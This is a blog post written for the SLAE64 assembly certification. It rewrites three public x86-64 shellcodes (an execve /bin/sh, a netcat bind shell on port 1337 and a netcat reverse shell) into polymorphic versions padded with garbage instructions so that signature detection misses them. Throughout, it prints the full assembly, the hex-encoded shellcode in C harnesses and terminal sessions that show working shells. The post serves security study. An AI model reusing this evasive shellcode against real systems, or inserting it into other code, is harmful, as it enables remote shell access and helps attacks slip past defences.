---
layout: post
title: Polymorphic Shellcode
date: 2021-01-17 20:30:00
categories: posts
comments: false
en: true
---

#### Introduction

These series of posts starting with the prefix "Assignment" will be created in order to fulfill the requirements of the SLAE64 certification. 

According to wikipedia, "Polymorphic code is code that uses a polymorphic engine to mutate while keeping the original algorithm intact. That is, the code changes itself each 
time it runs, but the function of the code (its semantics) will not change at all. For example, 1+3 and 6-2 both achieve the same result while using different values and 
operations.". This could include as well garbage instructions which do not affect execution at all. Nevertheless, it helps to beat pattern matching.

Today we are going to dive a little deep within Polymorphic shellcode. However, instead of using an engine, we will generate it with our own hands! 

The sixth assignment from the seven requires taking three [shellcodes](https://es.wikipedia.org/wiki/Shellcode) from [shell-storm.org](http://shell-storm.org/) and generate 
polymorphic versions of such. In addition, its size should not be bigger than 150%.

#### Execve Shellcode (Shellcode #1)

The first shellcode from the three will be one that executes ```/bin/sh``` through the ```execve``` syscall. It can be found [here](http://shell-storm.org/shellcode/files/shellcode-603.php). 

###### Original code

```term
    section .text
            global _start
 
    _start:
            xor     rdx, rdx
            mov     qword rbx, '//bin/sh'
            shr     rbx, 0x8
            push    rbx
            mov     rdi, rsp
            push    rax
            push    rdi
            mov     rsi, rsp
            mov     al, 0x3b
            syscall
```

There are infinite ways to modify such shellcode. For instance, "NOP equivalents" could be used, which add no functionality whatsoever and difficult pattern matching. 

###### Final code:

```term
global _start

_start:

            cmc                              ; Garbage NOP
            cdq                              ; Garbage NOP

            mov     qword rbx, '//bin/sh'
            shr     rbx, 0x8
            xor rsi, rsi                     ; Garbage NOP
            clc                              ; Garbage NOP
            push    rbx
            mov     rdi, rsp

            dec rbp                          ; Garbage NOP

            push    rax
            mul rbp                          ; Garbage NOP
            push    rdi

            lea r10, [rsi - 62]              ; Garbage NOP

            mov     rsi, rsp

            mul r12                          ; Garbage NOP

            lea r9, [rbp + 9]                ; Garbage NOP

            mov cl, 27                       ; Garbage NOP

            push word 0x20                   ; Pushes 0x20 into the stack.
            pop bx                           ; Pops this value into BX.

            mov al, bl                       ; The value in BL is copied into AL.
            add al, 0x1b                     ; As the value of AL is now 0x20, adding 0x1B will set its value to 0x3B, which is the execve syscall value.

            syscall
```

Let's dump the shellcode and test it!

```term
whitecr0wz@SLAE64:~/assembly/assignments/Assignment_6/1_shellcode$ nasm -f elf64 1.asm -o 1.o && ld 1.o -o 1 && for i in $(objdump -d ./1 -M intel |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo 
\xf5\x99\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x48\x31\xf6\xf8\x53\x48\x89\xe7\x48\xff\xcd\x50\x48\xf7\xe5\x57\x4c\x8d\x56\xc2\x48\x89\xe6\x49\xf7\xe4\x4c\x8d\x4d\x09\xb1\x1b\x66\x6a\x20\x66\x5b\x88\xd8\x04\x1b\x0f\x05
```

###### C format

```term
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xf5\x99\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x48\x31\xf6\xf8\x53\x48\x89\xe7\x48\xff\xcd\x50\x48\xf7\xe5\x57\x4c\x8d\x56\xc2\x48\x89\xe6\x49\xf7\xe4\x4c\x8d\x4d\x09\xb1\x1b\x66\x6a\x20\x66\x5b\x88\xd8\x04\x1b\x0f\x05"

;

main()
{

  printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}
```

#### EndGame #1

```term
whitecr0wz@SLAE64:~/assembly/assignments/Assignment_6/1_shellcode$ gcc 1_shellcode.c -o 1_shellcode -fno-stack-protector -z execstack -w 
whitecr0wz@SLAE64:~/assembly/assignments/Assignment_6/1_shellcode$ ./1_shellcode 
Shellcode Length:  59
$
```

Original size: 30
Final size: 59

Increment: 97%

#### Netcat Bind-Shell (Shellcode #2)

The second shellcode from the three will perform a bind-shell in port 1337 through the use of the tool ```netcat```. It can be found [here](http://shell-storm.org/shellcode/files/shellcode-822.php).

###### Original code:

```term
xor    	rdx,rdx
mov 	rdi,0x636e2f6e69622fff
shr	rdi,0x08
push 	rdi
mov 	rdi,rsp

mov	rcx,0x68732f6e69622fff
shr	rcx,0x08
push 	rcx
mov	rcx,rsp

mov     rbx,0x652dffffffffffff
shr	rbx,0x30
push	rbx
mov	rbx,rsp

mov	r10,0x37333331ffffffff
shr 	r10,0x20
push 	r10
mov	r10,rsp

mov	r9,0x702dffffffffffff
shr	r9,0x30
push 	r9
mov	r9,rsp

mov 	r8,0x6c2dffffffffffff
shr	r8,0x30
push 	r8
mov	r8,rsp

push	rdx  ;push NULL
push 	rcx  ;push address of 'bin/sh'
push	rbx  ;push address of '-e'
push	r10  ;push address of '1337'
push	r9   ;push address of '-p'
push	r8   ;push address of '-l'
push 	rdi  ;push address of '/bin/nc'

mov    	rsi,rsp
mov    	al,59
syscall
```

There aren't many things that we can do. Nonetheless, we can apply similar techniques as we did on the previous shellcode.

###### Final code:

```term
global _start

_start:

xor rdx, rdx

inc al                                        ; Garbage NOP
inc cl                                        ; Garbage NOP

mov 	rdi,0x636e2f6e69622fff
shr	rdi,0x08

push 	rdi
mov 	rdi,rsp

mov	rcx,0x68732f6e69622fff
shr	rcx,0x08
stc                                           ; Garbage NOP
push 	rcx

nop                                           ; Garbage NOP
nop                                           ; Garbage NOP

mov	rcx,rsp

mov     rbx,0x652dffffffffffff

shr al, 2                                     ; Garbage NOP

shr	rbx,0x30
cdq                                           ; Garbage NOP
nop                                           ; Garbage NOP
cmc                                           ; Garbage NOP

push	rbx
mov	rbx,rsp

mov	r10,0x37333331ffffffff

push r15                                      ; Garbage NOP
pop r14                                       ; Garbage NOP
push r15                                      ; Garbage NOP
pop r14                                       ; Garbage NOP

shr 	r10,0x20
push 	r10
mov	r10,rsp

mov	r9,0x702dffffffffffff
shr	r9,0x30
push 	r9
mov	r9,rsp

mov 	r8,0x6c2dffffffffffff
shr	r8,0x30

loop:

rol rbp, 59                                   ; Garbage NOP
ror r14, 60                                   ; Garbage NOP
shr r13, 8                                    ; Garbage NOP

push 	r8
mov	r8,rsp

push	rdx  ;push NULL
push 	rcx  ;push address of 'bin/sh'

push	rbx  ;push address of '-e'
push	r10  ;push address of '1337'

nop                                          ; Garbage NOP
stc                                          ; Garbage NOP
lea r12, [rsp - 0xFF]                        ; Garbage NOP
nop                                          ; Garbage NOP

cld                                          ; Garbage NOP
nop                                          ; Garbage NOP

push	r9   ;push address of '-p'
push	r8   ;push address of '-l'
push 	rdi  ;push address of '/bin/nc'

mov    	rsi,rsp

stc                                          ; Garbage NOP
cmc                                          ; Garbage NOP
push rsp                                     ; Garbage NOP
pop r14                                      ; Garbage NOP
push r15                                     ; Garbage NOP
pop rax                                      ; Garbage NOP

mov    	al, 0x0c                             ; Gives AL the value 0C.
add     al, 0x2f                             ; Adds AL with 2F, this will grant AL the value 3B, which is the syscall number for execve.

syscall
```

Let's test this shellcode once again.

```term
whitecr0wz@SLAE64:~/assembly/assignments/Assignment_6/2_shellcode$ nasm -f elf64 1.asm -o 1.o && ld 1.o -o 1 && for i in $(objdump -d ./1 -M intel |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
```

###### C format

```term
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x48\x31\xd2\xfe\xc0\xfe\xc1\x48\xbf\xff\x2f\x62\x69\x6e\x2f\x6e\x63\x48\xc1\xef\x08\x57\x48\x89\xe7\x48\xb9\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xe9\x08\xf9\x51\x90\x90\x48
\x89\xe1\x48\xbb\xff\xff\xff\xff\xff\xff\x2d\x65\xc0\xe8\x02\x48\xc1\xeb\x30\x99\x90\xf5\x53\x48\x89\xe3\x49\xba\xff\xff\xff\xff\x31\x33\x33\x37\x41\x57\x41\x5e\x41\x57\x41\x5e\
x49\xc1\xea\x20\x41\x52\x49\x89\xe2\x49\xb9\xff\xff\xff\xff\xff\xff\x2d\x70\x49\xc1\xe9\x30\x41\x51\x49\x89\xe1\x49\xb8\xff\xff\xff\xff\xff\xff\x2d\x6c\x49\xc1\xe8\x30\x48\xc1\x
c5\x3b\x49\xc1\xce\x3c\x49\xc1\xed\x08\x41\x50\x49\x89\xe0\x52\x51\x53\x41\x52\x90\xf9\x4c\x8d\xa4\x24\x01\xff\xff\xff\x90\xfc\x90\x41\x51\x41\x50\x57\x48\x89\xe6\xf9\xf5\x54\x4
1\x5e\x41\x57\x58\xb0\x0c\x04\x2f\x0f\x05"

;

main()
{

  printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}
```

#### EndGame #2

```term
whitecr0wz@SLAE64:~/assembly/assignments/Assignment_6/2_shellcode$ gcc 2_shellcode.c -o 2_shellcode -fno-stack-protector -z execstack -w 
whitecr0wz@SLAE64:~/assembly/assignments/Assignment_6/2_shellcode$ ./2_shellcode 
Shellcode Length:  187

─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
root@whitecr0wz:~# rlwrap nc 192.168.100.205 1337 -v 
192.168.100.205: inverse host lookup failed: Unknown host
(UNKNOWN) [192.168.100.205] 1337 (?) open
python -c 'import pty;pty.spawn("/bin/bash")'; 
<0wz/assembly/assignments/Assignment_6/2_shellcode$ id 
id 
uid=1000(whitecr0wz) gid=1000(whitecr0wz) groups=1000(whitecr0wz),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
<0wz/assembly/assignments/Assignment_6/2_shellcode$
```

Original size: 131
Final size: 187

Increment: 43%

#### Reverse-shell Shellcode (Shellcode #3)

For the final shellcode, I have chosen to use a reverse-shell that arranges a connection towards the localhost on port 1337. It can be found [here](http://shell-storm.org/shellcode/files/shellcode-823.php).

###### Original code:

```term
xor    	rdx,rdx
mov 	rdi,0x636e2f6e69622fff
shr	rdi,0x08
push 	rdi
mov 	rdi,rsp

mov	rcx,0x68732f6e69622fff
shr	rcx,0x08
push 	rcx
mov	rcx,rsp

mov     rbx,0x652dffffffffffff
shr	rbx,0x30
push	rbx
mov	rbx,rsp

mov	r10,0x37333331ffffffff
shr 	r10,0x20
push 	r10
mov	r10,rsp

jmp short ip
continue:
pop 	r9

push	rdx  ;push NULL
push 	rcx  ;push address of 'bin/sh'
push	rbx  ;push address of '-e'
push	r10  ;push address of '1337'
push	r9   ;push address of 'ip'
push 	rdi  ;push address of '/bin/nc'

mov    	rsi,rsp
mov    	al,59
syscall


ip:
	call  continue
	db "127.0.0.1"
```

Once again, there isn't much to comment, other than the fact that we can apply the aforementioned polymorphic techniques against this shellcode.

###### Final code:

```term
global _start

_start:

xor    	rdx,rdx
nop                                                 ; Garbage NOP
nop                                                 ; Garbage NOP
mov 	rdi,0x636e2f6e69622fff
shr	rdi,0x08
dec al                                              ; Garbage NOP
push 	rdi
mov 	rdi,rsp

mov	rcx,0x68732f6e69622fff
shr	rcx,0x08
dec al                                              ; Garbage NOP


push 	rcx
inc cl                                              ; Garbage NOP
dec cl                                              ; Garbage NOP
mov	rcx,rsp

mov     rbx,0x652dffffffffffff
std                                                 ; Garbage NOP
cwd                                                 ; Garbage NOP
shr	rbx,0x30

cmc                                                 ; Garbage NOP

push	rbx
mov	rbx,rsp

mov	r10,0x37333331ffffffff
shr 	r10,0x20
std                                                 ; Garbage NOP
push 	r10
mov	r10,rsp

jmp short ip
continue:
pop 	r9

push	rdx  ;push NULL

push 	rcx  ;push address of 'bin/sh'
nop                                                 ; Garbage NOP
inc dl                                              ; Garbage NOP  
dec dl                                              ; Garbage NOP

push	rbx  ;push address of '-e'
inc cl                                              ; Garbage NOP
dec cl                                              ; Garbage NOP
nop                                                 ; Garbage NOP
push	r10  ;push address of '1337'

dec al                                              ; Garbage NOP

push	r9   ;push address of 'ip'

inc bl                                              ; Garbage NOP
dec bl                                              ; Garbage NOP

push 	rdi  ;push address of '/bin/nc'

nop                                                 ; Garbage NOP
mov    	rsi,rsp
mov al, 59

syscall

ip:
	call  continue
	db "127.0.0.1"
```

Let's assemble, link, and test this shellcode.

```term
whitecr0wz@SLAE64:~/assembly/assignments/Assignment_6/3_shellcode$ nasm -f elf64 1.asm -o 1.o && ld 1.o -o 1 && for i in $(objdump -d ./1 -M intel |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
```

###### C format

```term
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x48\x31\xd2\x90\x90\x48\xbf\xff\x2f\x62\x69\x6e\x2f\x6e\x63\x48\xc1\xef\x08\xfe\xc8\x57\x48\x89\xe7\x48\xb9\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xe9\x08\xfe\xc8\x51\xfe\xc1
\xfe\xc9\x48\x89\xe1\x48\xbb\xff\xff\xff\xff\xff\xff\x2d\x65\xfd\x66\x99\x48\xc1\xeb\x30\xf5\x53\x48\x89\xe3\x49\xba\xff\xff\xff\xff\x31\x33\x33\x37\x49\xc1\xea\x20\xfd\x41\x52\
x49\x89\xe2\xeb\x22\x41\x59\x52\x51\x90\xfe\xc2\xfe\xca\x53\xfe\xc1\xfe\xc9\x90\x41\x52\xfe\xc8\x41\x51\xfe\xc3\xfe\xcb\x57\x90\x48\x89\xe6\xb0\x3b\x0f\x05\xe8\xd9\xff\xff\xff\x
31\x32\x37\x2e\x30\x2e\x30\x2e\x31"

;

main()
{

  printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
```

#### EndGame #3

```term
whitecr0wz@SLAE64:~/assembly/assignments/Assignment_6/3_shellcode$ gcc 3_shellcode.c -o 3_shellcode -fno-stack-protector -z execstack -w 
whitecr0wz@SLAE64:~/assembly/assignments/Assignment_6/3_shellcode$ ./3_shellcode 
Shellcode Length:  141

─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
whitecr0wz@SLAE64:~$ rlwrap nc -lvp 1337 
listening on [any] 1337 ...
connect to [127.0.0.1] from localhost [127.0.0.1] 55804
python -c 'import pty;pty.spawn("/bin/bash")';
<0wz/assembly/assignments/Assignment_6/3_shellcode$ id 
id 
uid=1000(whitecr0wz) gid=1000(whitecr0wz) groups=1000(whitecr0wz),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
<0wz/assembly/assignments/Assignment_6/3_shellcode$
```

Original size: 109
Final size: 141

Increment: 30%

### Code

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: [http://securitytube-training.com/online-
courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE64-27812/PA-27812

You can find all of the used resources within this post [here](https://github.com/whitecr0wz/SLAE/tree/main/SLAE64/Assignment_6).
